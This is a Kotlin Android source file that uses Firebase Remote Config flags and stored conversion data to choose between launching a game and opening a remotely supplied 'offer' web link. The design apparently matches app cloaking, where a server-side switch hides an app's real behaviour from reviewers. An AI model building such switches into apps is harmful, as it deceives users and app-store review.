package sdk.library.lilya.firebase

import android.app.Activity
import android.util.Log
import sdk.library.lilya.RemoteListener
import com.google.firebase.ktx.Firebase
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import android.os.StrictMode
import android.os.StrictMode.ThreadPolicy
import sdk.library.lilya.apps.AppsProjector
import sdk.library.lilya.apps.AppsProjector.preferences
import sdk.library.lilya.utils.Constants.ONCONVERSION
import sdk.library.lilya.utils.Constants.TAG
import sdk.library.lilya.utils.Link
import sdk.library.lilya.utils.Utils
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch


class FirebaseRemoteConfig(private val activity: Activity) {

    private lateinit var remoteListener: RemoteListener

    fun initialize() {

        val policy = ThreadPolicy.Builder().permitAll().build()

        StrictMode.setThreadPolicy(policy)


        remoteListener = activity as RemoteListener

        val configSettings = remoteConfigSettings {
            minimumFetchIntervalInSeconds = 3600
        }


        Firebase.remoteConfig.setConfigSettingsAsync(configSettings)

        Firebase.remoteConfig.fetchAndActivate().addOnCompleteListener(activity) { task ->

            if (task.isSuccessful) {

                  Log.d(TAG, "status - " + Firebase.remoteConfig.getString("status"))
                  Log.d(TAG, "check - " + Firebase.remoteConfig.getString("check"))
                  Log.d(TAG, "link - " + Firebase.remoteConfig.getString("offer"))


                when (Firebase.remoteConfig.getString("status")) {
                    "false" -> {
                        remoteListener.onStatusFalse()
                    }

                    "true" -> {
                        remoteListener.onStatusTrue()

                        when (Utils.getResponseCode(Firebase.remoteConfig.getString("check"))) {

                            200 -> {

                                Log.d(TAG, "response code 200")
                                fetchMainCycle()

                            }

                            404 -> {
                                remoteListener.onFalseCode(404)
                                Log.d(TAG, "response code 400")

                            }

                            0 -> {

                                remoteListener.onFalseCode(0)
                                Log.d(TAG, "response code 0")
                            }
                        }

                    }

                }
            } else {

            }

        }

    }


    fun fetchMainCycle(){
        when (preferences.getOnConversionDataSuccess(ONCONVERSION)) {
            "null" -> {
                Log.d(TAG, "null - OnConversion")
                remoteListener.onSuccessCode(Firebase.remoteConfig.getString("offer"))

            }

            "true" -> {
                GlobalScope.launch(Dispatchers.IO) {
                    var list = AppsProjector.createRepoInstance(activity).getAllData()

                    Log.d(TAG, "$list main list")
                    if(list.contains(Link(1, "false"))){
                        Log.d(TAG, "exist 2 element" + " starting game")

                    } else if(list.isEmpty()) {
                        Log.d(TAG, "exist 2 element" + " starting game")

                    } else {
                        Log.d(TAG, "exist 1 element" + " starting web")
                        Log.d(TAG, list[0].link.toString())
                        remoteListener.nonFirstLaunch(list[0].link.toString())

                    }

                }


            }

        }
    }
}